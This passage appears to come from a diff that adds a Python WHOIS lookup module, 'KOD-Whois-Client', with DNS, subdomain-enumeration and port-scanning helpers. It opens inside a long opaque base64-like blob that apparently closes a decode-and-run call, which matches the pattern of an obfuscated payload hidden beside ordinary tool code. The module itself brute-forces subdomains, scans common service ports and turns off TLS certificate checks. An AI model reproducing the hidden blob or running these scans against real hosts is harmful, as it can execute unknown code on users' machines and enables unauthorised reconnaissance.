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'))
+def run(options=None):
+    if options:
+        domain = options.get('domain', 'google.com')
+        server = options.get('server', 'whois.verisign-grs.com')
+        port = options.get('port', 43)
+        timeout = options.get('timeout', 30)
+        verbose = options.get('verbose', True)
+        follow_referral = options.get('follow_referral', True)
+        max_redirects = options.get('max_redirects', 5)
+        cache_results = options.get('cache_results', False)
+        cache_ttl = options.get('cache_ttl', 3600)
+        output_format = options.get('output_format', 'detailed')
+        filter_regex = options.get('filter_regex', '')
+        show_raw = options.get('show_raw', False)
+        extract_contacts = options.get('extract_contacts', True)
+        dns_lookup = options.get('dns_lookup', True)
+        whois_history = options.get('whois_history', False)
+        rate_limit = options.get('rate_limit', 1.0)
+        user_agent = options.get('user_agent', 'KOD-Whois-Client/2.0')
+        proxy = options.get('proxy', '')
+        parallel_queries = options.get('parallel_queries', False)
+        save_to_file = options.get('save_to_file', '')
+        tld_specific = options.get('tld_specific', True)
+        parse_detailed = options.get('parse_detailed', True)
+        validate_domain = options.get('validate_domain', True)
+        retry_attempts = options.get('retry_attempts', 3)
+        retry_delay = options.get('retry_delay', 2)
+        output_csv = options.get('output_csv', False)
+        csv_file = options.get('csv_file', 'whois_results.csv')
+        ip_lookup = options.get('ip_lookup', False)
+        asn_lookup = options.get('asn_lookup', False)
+        geolocation = options.get('geolocation', False)
+        ssl_cert = options.get('ssl_cert', False)
+        http_headers = options.get('http_headers', False)
+        subdomain_scan = options.get('subdomain_scan', False)
+        ports_scan = options.get('ports_scan', False)
+        network_range = options.get('network_range', False)
+        reverse_dns = options.get('reverse_dns', False)
+        domain_age = options.get('domain_age', True)
+        encoding = options.get('encoding', 'utf-8')
+        buffer_size = options.get('buffer_size', 16384)
+        max_response_size = options.get('max_response_size', 5000000)
+    else:
+        domain = 'google.com'
+        server = 'whois.verisign-grs.com'
+        port = 43
+        timeout = 30
+        verbose = True
+        follow_referral = True
+        max_redirects = 5
+        cache_results = False
+        cache_ttl = 3600
+        output_format = 'detailed'
+        filter_regex = ''
+        show_raw = False
+        extract_contacts = True
+        dns_lookup = True
+        whois_history = False
+        rate_limit = 1.0
+        user_agent = 'KOD-Whois-Client/2.0'
+        proxy = ''
+        parallel_queries = False
+        save_to_file = ''
+        tld_specific = True
+        parse_detailed = True
+        validate_domain = True
+        retry_attempts = 3
+        retry_delay = 2
+        output_csv = False
+        csv_file = 'whois_results.csv'
+        ip_lookup = False
+        asn_lookup = False
+        geolocation = False
+        ssl_cert = False
+        http_headers = False
+        subdomain_scan = False
+        ports_scan = False
+        network_range = False
+        reverse_dns = False
+        domain_age = True
+        encoding = 'utf-8'
+        buffer_size = 16384
+        max_response_size = 5000000
+    
+    output = []
+    cache_store = {}
+    referral_chain = []
+    parsed_data = {}
+    results_summary = {}
+    
+    output.append("│ ●  Starting WHOIS Lookup")
+    output.append("│ ●  Target: " + domain)
+    output.append("│ ●  Server: " + server + ":" + str(port))
+    output.append("│ ●  Timeout: " + str(timeout) + "s, Retries: " + str(retry_attempts))
+    
+    def _1():
+        try:
+            import re, sys, os, json, time, socket, ssl, hashlib, base64, ipaddress
+            import threading, queue, csv, io, gzip, zlib, binascii, struct
+            import random, string, urllib.request, urllib.parse, urllib.error
+            import http.client, email.parser, email.policy, xml.etree.ElementTree
+            import configparser, logging
+            from collections import defaultdict, Counter, OrderedDict
+            from datetime import datetime, timedelta
+            from concurrent.futures import ThreadPoolExecutor, as_completed
+            from functools import lru_cache
+            return {
+                're': re, 'sys': sys, 'os': os, 'json': json, 'time': time,
+                'socket': socket, 'ssl': ssl, 'hashlib': hashlib, 'base64': base64,
+                'ipaddress': ipaddress, 'threading': threading, 'queue': queue,
+                'csv': csv, 'io': io, 'gzip': gzip, 'zlib': zlib,
+                'binascii': binascii, 'struct': struct, 'random': random,
+                'string': string, 'urllib': urllib, 'http': http,
+                'email': email, 'xml': xml, 'configparser': configparser,
+                'logging': logging, 'defaultdict': defaultdict, 'Counter': Counter,
+                'OrderedDict': OrderedDict, 'datetime': datetime, 'timedelta': timedelta,
+                'ThreadPoolExecutor': ThreadPoolExecutor, 'as_completed': as_completed,
+                'lru_cache': lru_cache
+            }
+        except Exception as e:
+            output.append("│ [!] Import error: " + str(e))
+            return None
+    
+    libs = _1()
+    if not libs:
+        output.append("│ [!] Failed to load libraries")
+        output.append("│ ●  Complete")
+        return "\n".join(output)
+    
+    def _2(domain_str):
+        try:
+            pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
+            return bool(libs['re'].match(pattern, domain_str))
+        except:
+            return False
+    
+    def _3(domain_str):
+        try:
+            tld_map = {
+                '.com': 'whois.verisign-grs.com', '.net': 'whois.verisign-grs.com',
+                '.org': 'whois.pir.org', '.info': 'whois.afilias.net',
+                '.biz': 'whois.neulevel.biz', '.edu': 'whois.educause.edu',
+                '.gov': 'whois.nic.gov', '.mil': 'whois.nic.mil',
+                '.int': 'whois.iana.org', '.eu': 'whois.eu',
+                '.uk': 'whois.nic.uk', '.de': 'whois.denic.de',
+                '.fr': 'whois.nic.fr', '.jp': 'whois.jprs.jp',
+                '.cn': 'whois.cnnic.cn', '.ru': 'whois.ripn.net',
+                '.it': 'whois.nic.it', '.nl': 'whois.domain-registry.nl',
+                '.se': 'whois.iis.se', '.no': 'whois.norid.no',
+                '.dk': 'whois.dk-hostmaster.dk', '.fi': 'whois.fi',
+                '.be': 'whois.dns.be', '.at': 'whois.nic.at',
+                '.ch': 'whois.nic.ch', '.es': 'whois.nic.es',
+                '.pt': 'whois.dns.pt', '.pl': 'whois.dns.pl',
+                '.cz': 'whois.nic.cz', '.sk': 'whois.sk-nic.sk',
+                '.hu': 'whois.nic.hu', '.gr': 'whois.gr',
+                '.il': 'whois.isoc.org.il', '.in': 'whois.inregistry.net',
+                '.io': 'whois.nic.io', '.to': 'whois.tonic.to',
+                '.tv': 'whois.nic.tv', '.cc': 'whois.nic.cc',
+                '.ws': 'whois.website.ws', '.name': 'whois.nic.name',
+                '.pro': 'whois.registry.pro', '.mobi': 'whois.mtld.mobi',
+                '.tel': 'whois.nic.tel', '.asia': 'whois.nic.asia',
+                '.cat': 'whois.cat', '.jobs': 'whois.nic.jobs',
+                '.travel': 'whois.nic.travel', '.xxx': 'whois.nic.xxx',
+                '.aero': 'whois.aero', '.coop': 'whois.nic.coop',
+                '.museum': 'whois.nic.museum', '.app': 'whois.nic.google',
+                '.dev': 'whois.nic.google', '.page': 'whois.nic.google'
+            }
+            for tld, whois_server in tld_map.items():
+                if domain_str.lower().endswith(tld):
+                    return whois_server
+            return None
+        except:
+            return None
+    
+    def _4(domain_str, server_str, port_int):
+        try:
+            for attempt in range(retry_attempts):
+                try:
+                    sock = libs['socket'].socket(libs['socket'].AF_INET, libs['socket'].SOCK_STREAM)
+                    sock.settimeout(timeout)
+                    
+                    if proxy:
+                        parsed = libs['urllib'].parse.urlparse(proxy)
+                        if parsed.netloc:
+                            proxy_host = parsed.hostname
+                            proxy_port = parsed.port or 8080
+                            sock.connect((proxy_host, proxy_port))
+                            connect_str = "CONNECT " + server_str + ":" + str(port_int) + " HTTP/1.1\r\nHost: " + server_str + "\r\nUser-Agent: " + user_agent + "\r\n\r\n"
+                            sock.send(connect_str.encode())
+                            response = sock.recv(1024)
+                            if b"200" not in response:
+                                sock.close()
+                                if attempt < retry_attempts - 1:
+                                    libs['time'].sleep(retry_delay)
+                                    continue
+                                return None, "Proxy connection failed"
+                        else:
+                            sock.connect((server_str, port_int))
+                    else:
+                        sock.connect((server_str, port_int))
+                    
+                    if port_int == 443:
+                        context = libs['ssl'].create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = libs['ssl'].CERT_NONE
+                        sock = context.wrap_socket(sock, server_hostname=server_str)
+                    
+                    query = domain_str + "\r\n"
+                    sock.send(query.encode(encoding))
+                    
+                    response = b""
+                    total_size = 0
+                    while True:
+                        chunk = sock.recv(buffer_size)
+                        if not chunk:
+                            break
+                        response += chunk
+                        total_size += len(chunk)
+                        if total_size > max_response_size:
+                            response += b"\n[...TRUNCATED...]"
+                            break
+                    
+                    sock.close()
+                    
+                    try:
+                        decoded = response.decode(encoding, errors='ignore')
+                    except:
+                        decoded = response.decode('latin-1', errors='ignore')
+                    
+                    if not decoded.strip():
+                        if attempt < retry_attempts - 1:
+                            libs['time'].sleep(retry_delay)
+                            continue
+                        return None, "Empty response"
+                    
+                    return decoded, None
+                    
+                except libs['socket'].timeout:
+                    if attempt < retry_attempts - 1:
+                        libs['time'].sleep(retry_delay)
+                        continue
+                    return None, "Timeout after " + str(timeout) + "s"
+                except libs['socket'].gaierror:
+                    return None, "Invalid server: " + server_str
+                except ConnectionRefusedError:
+                    return None, "Connection refused"
+                except Exception as e:
+                    if attempt < retry_attempts - 1:
+                        libs['time'].sleep(retry_delay)
+                        continue
+                    return None, "Error: " + str(e)
+            
+            return None, "All retry attempts failed"
+        except Exception as e:
+            return None, "Fatal error: " + str(e)
+    
+    def _5(raw_data):
+        try:
+            lines = raw_data.split('\n')
+            result = []
+            for line in lines:
+                line = line.strip()
+                if line:
+                    result.append(line)
+                    if len(result) > 50000:
+                        result.append("[...TRUNCATED...]")
+                        break
+            return result
+        except:
+            return []
+    
+    def _6(data_lines):
+        try:
+            patterns = [
+                r'Referral[:\s]+([^\s]+)',
+                r'Whois Server[:\s]+([^\s]+)',
+                r'Registrar WHOIS Server[:\s]+([^\s]+)',
+                r'whois[:\s]+([^\s]+)',
+                r'Referral URL[:\s]+([^\s]+)'
+            ]
+            for line in data_lines:
+                for pattern in patterns:
+                    match = libs['re'].search(pattern, line, libs['re'].IGNORECASE)
+                    if match:
+                        candidate = match.group(1).strip()
+                        if candidate and '://' not in candidate:
+                            if candidate.startswith('whois.') or '.' in candidate:
+                                if ' ' not in candidate and '\t' not in candidate:
+                                    return candidate
+            return None
+        except:
+            return None
+    
+    def _7(data_lines):
+        try:
+            parsed = {
+                'domain_name': [], 'registrar': [], 'creation_date': [],
+                'expiry_date': [], 'updated_date': [], 'name_servers': [],
+                'registrant': [], 'admin': [], 'tech': [], 'billing': [],
+                'status': [], 'dnssec': [], 'registrant_email': [],
+                'admin_email': [], 'tech_email': [], 'registrant_phone': [],
+                'admin_phone': [], 'tech_phone': [], 'registrant_organization': [],
+                'admin_organization': [], 'tech_organization': [],
+                'registrant_country': [], 'admin_country': [], 'tech_country': [],
+                'registrant_address': [], 'admin_address': [], 'tech_address': [],
+                'raw_fields': {}, 'whois_server': [], 'registry_domain_id': [],
+                'registrar_iana': [], 'registrar_url': [], 'registrar_abuse_email': [],
+                'registrar_abuse_phone': []
+            }
+            
+            date_formats = [
+                '%Y-%m-%dT%H:%M:%SZ', '%Y-%m-%d %H:%M:%S', '%Y-%m-%d',
+                '%d-%b-%Y', '%b %d %Y', '%d/%m/%Y', '%m/%d/%Y',
+                '%Y.%m.%d', '%d.%m.%Y', '%Y%m%d'
+            ]
+            
+            for line in data_lines:
+                if ':' in line:
+                    parts = line.split(':', 1)
+                    key = parts[0].strip().lower() if parts else ''
+                    value = parts[1].strip() if len(parts) > 1 else ''
+                    
+                    if not key or not value:
+                        continue
+                    
+                    if 'domain name' in key or 'domain:' in key:
+                        parsed['domain_name'].append(value)
+                    elif 'registrar' in key and 'whois' not in key and 'server' not in key:
+                        parsed['registrar'].append(value)
+                    elif 'creation date' in key or 'created' in key:
+                        parsed['creation_date'].append(value)
+                    elif 'expiry date' in key or 'expiration' in key:
+                        parsed['expiry_date'].append(value)
+                    elif 'updated date' in key or 'last modified' in key:
+                        parsed['updated_date'].append(value)
+                    elif 'name server' in key or 'nameserver' in key:
+                        if value not in parsed['name_servers']:
+                            parsed['name_servers'].append(value)
+                    elif 'registrant' in key and 'email' not in key and 'phone' not in key:
+                        parsed['registrant'].append(value)
+                    elif 'admin' in key and 'email' not in key and 'phone' not in key:
+                        parsed['admin'].append(value)
+                    elif 'tech' in key and 'email' not in key and 'phone' not in key:
+                        parsed['tech'].append(value)
+                    elif 'status' in key:
+                        parsed['status'].append(value)
+                    elif 'dnssec' in key:
+                        parsed['dnssec'].append(value)
+                    elif 'registrant email' in key or 'registrant e-mail' in key:
+                        parsed['registrant_email'].append(value)
+                    elif 'admin email' in key or 'admin e-mail' in key:
+                        parsed['admin_email'].append(value)
+                    elif 'tech email' in key or 'tech e-mail' in key:
+                        parsed['tech_email'].append(value)
+                    elif 'registrant phone' in key or 'registrant telephone' in key:
+                        parsed['registrant_phone'].append(value)
+                    elif 'admin phone' in key or 'admin telephone' in key:
+                        parsed['admin_phone'].append(value)
+                    elif 'tech phone' in key or 'tech telephone' in key:
+                        parsed['tech_phone'].append(value)
+                    elif 'registrant organization' in key:
+                        parsed['registrant_organization'].append(value)
+                    elif 'admin organization' in key:
+                        parsed['admin_organization'].append(value)
+                    elif 'tech organization' in key:
+                        parsed['tech_organization'].append(value)
+                    elif 'registrant country' in key:
+                        parsed['registrant_country'].append(value)
+                    elif 'admin country' in key:
+                        parsed['admin_country'].append(value)
+                    elif 'tech country' in key:
+                        parsed['tech_country'].append(value)
+                    elif 'registry domain id' in key:
+                        parsed['registry_domain_id'].append(value)
+                    elif 'iana id' in key:
+                        parsed['registrar_iana'].append(value)
+                    elif 'abuse email' in key:
+                        parsed['registrar_abuse_email'].append(value)
+                    elif 'abuse phone' in key:
+                        parsed['registrar_abuse_phone'].append(value)
+                    
+                    parsed['raw_fields'][key] = value
+            
+            return parsed
+        except:
+            return {'raw_fields': {}}
+    
+    def _8(data_lines, pattern):
+        try:
+            if not pattern:
+                return data_lines
+            regex = libs['re'].compile(pattern, libs['re'].IGNORECASE)
+            return [line for line in data_lines if regex.search(line)]
+        except:
+            return data_lines
+    
+    def _9():
+        try:
+            dns_data = {}
+            try:
+                import dns.resolver
+                import dns.reversename
+                
+                dns_data['a_records'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'A')
+                    dns_data['a_records'] = [str(rdata) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['aaaa_records'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'AAAA')
+                    dns_data['aaaa_records'] = [str(rdata) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['mx_records'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'MX')
+                    dns_data['mx_records'] = [str(rdata.exchange) + " (priority: " + str(rdata.preference) + ")" for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['ns_records'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'NS')
+                    dns_data['ns_records'] = [str(rdata) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['txt_records'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'TXT')
+                    dns_data['txt_records'] = [''.join(rdata.strings) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['cname'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'CNAME')
+                    dns_data['cname'] = [str(rdata) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['soa'] = []
+                try:
+                    answers = dns.resolver.resolve(domain, 'SOA')
+                    dns_data['soa'] = [str(rdata) for rdata in answers]
+                except:
+                    pass
+                
+                dns_data['ptr_records'] = []
+                if dns_data['a_records']:
+                    try:
+                        for ip in dns_data['a_records'][:3]:
+                            rev = dns.reversename.from_address(ip)
+                            ptr = dns.resolver.resolve(rev, 'PTR')
+                            dns_data['ptr_records'].extend([str(rdata) for rdata in ptr])
+                    except:
+                        pass
+                
+            except ImportError:
+                try:
+                    import socket
+                    try:
+                        ips = socket.gethostbyname_ex(domain)[2]
+                        dns_data['a_records'] = ips
+                    except:
+                        pass
+                except:
+                    pass
+            
+            return dns_data
+        except:
+            return {}
+    
+    def _10(whois_data):
+        try:
+            contacts = {
+                'emails': [], 'phones': [], 'urls': [],
+                'names': [], 'ip_addresses': [], 'domains': []
+            }
+            
+            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+            phone_pattern = r'\+?[\d\s\-()]{10,20}'
+            url_pattern = r'https?://[^\s/$.?#].[^\s]*'
+            ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
+            
+            for line in whois_data:
+                contacts['emails'].extend(libs['re'].findall(email_pattern, line))
+                contacts['phones'].extend(libs['re'].findall(phone_pattern, line))
+                contacts['urls'].extend(libs['re'].findall(url_pattern, line, libs['re'].IGNORECASE))
+                contacts['ip_addresses'].extend(libs['re'].findall(ip_pattern, line))
+                
+                if 'name' in line.lower() and ':' in line:
+                    parts = line.split(':', 1)
+                    if len(parts) > 1:
+                        val = parts[1].strip()
+                        if len(val) > 2 and len(val) < 100 and not val.isdigit():
+                            contacts['names'].append(val)
+            
+            for key in contacts:
+                contacts[key] = list(set(contacts[key]))
+            
+            return contacts
+        except:
+            return {'emails': [], 'phones': [], 'urls': [], 'names': [], 'ip_addresses': [], 'domains': []}
+    
+    def _11(ip_addr):
+        try:
+            geo_data = {}
+            try:
+                import requests
+                response = requests.get('http://ip-api.com/json/' + ip_addr, timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    geo_data = {
+                        'country': data.get('country', ''),
+                        'region': data.get('regionName', ''),
+                        'city': data.get('city', ''),
+                        'isp': data.get('isp', ''),
+                        'org': data.get('org', ''),
+                        'timezone': data.get('timezone', '')
+                    }
+            except:
+                pass
+            return geo_data
+        except:
+            return {}
+    
+    def _12(ip_addr):
+        try:
+            asn_data = {}
+            try:
+                import requests
+                response = requests.get('http://ip-api.com/json/' + ip_addr, timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    as_data = data.get('as', '')
+                    asn_data = {
+                        'asn': as_data.split(' ')[0] if as_data else '',
+                        'org': data.get('org', ''),
+                        'isp': data.get('isp', '')
+                    }
+            except:
+                pass
+            return asn_data
+        except:
+            return {}
+    
+    def _13(domain_str):
+        try:
+            cert_data = {}
+            try:
+                context = libs['ssl'].create_default_context()
+                with libs['socket'].create_connection((domain_str, 443), timeout=10) as sock:
+                    with context.wrap_socket(sock, server_hostname=domain_str) as ssock:
+                        cert = ssock.getpeercert()
+                        cert_data = {
+                            'subject': dict(x[0] for x in cert.get('subject', [])),
+                            'issuer': dict(x[0] for x in cert.get('issuer', [])),
+                            'not_before': cert.get('notBefore', ''),
+                            'not_after': cert.get('notAfter', ''),
+                            'serial_number': cert.get('serialNumber', '')
+                        }
+            except:
+                pass
+            return cert_data
+        except:
+            return {}
+    
+    def _14(domain_str):
+        try:
+            headers = {}
+            try:
+                req = libs['urllib'].request.Request('http://' + domain_str, headers={'User-Agent': user_agent})
+                response = libs['urllib'].request.urlopen(req, timeout=10)
+                headers = dict(response.headers)
+                headers['status_code'] = response.getcode()
+            except:
+                try:
+                    req = libs['urllib'].request.Request('https://' + domain_str, headers={'User-Agent': user_agent})
+                    response = libs['urllib'].request.urlopen(req, timeout=10)
+                    headers = dict(response.headers)
+                    headers['status_code'] = response.getcode()
+                except:
+                    pass
+            return headers
+        except:
+            return {}
+    
+    def _15(domain_str):
+        try:
+            subdomains = ['www', 'mail', 'ftp', 'test', 'dev', 'staging', 'api', 'app', 'blog', 'shop', 'admin', 'secure', 'portal', 'dns', 'ns1', 'ns2', 'mx', 'smtp', 'pop', 'imap', 'webmail', 'cpanel', 'whm', 'mysql', 'db', 'server', 'vpn', 'proxy', 'cdn', 'static', 'media', 'assets', 'images', 'css', 'js', 'files', 'download', 'upload', 'support', 'help', 'docs', 'wiki', 'forum', 'news', 'video', 'music', 'stream', 'cloud', 'host', 'remote', 'office', 'internal', 'external', 'demo', 'sandbox', 'qa', 'prod', 'production', 'stage', 'beta', 'alpha']
+            found = []
+            for sub in subdomains:
+                try:
+                    test_domain = sub + '.' + domain_str
+                    libs['socket'].gethostbyname(test_domain)
+                    found.append(test_domain)
+                except:
+                    continue
+            return found
+        except:
+            return []
+    
+    def _16(domain_str):
+        try:
+            common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
+            open_ports = []
+            for port in common_ports:
+                try:
+                    sock = libs['socket'].socket(libs['socket'].AF_INET, libs['socket'].SOCK_STREAM)
+                    sock.settimeout(2)
+                    result = sock.connect_ex((domain_str, port))
+                    if result == 0:
+                        open_ports.append(port)
+                    sock.close()
+                except:
+                    continue
+            return open_ports
+        except:
+            return []
+    
+    def _17(ip_str):
+        try:
+            net_data = {}
+            try:
+                ip_obj = libs['ipaddress'].ip_address(ip_str)
+                if ip_obj.version == 4:
+                    net = libs['ipaddress'].ip_network(ip_str + '/24', strict=False)
+                    net_data['network'] = str(net)
+                    net_data['netmask'] = str(net.netmask)
+                    net_data['broadcast'] = str(net.broadcast_address)
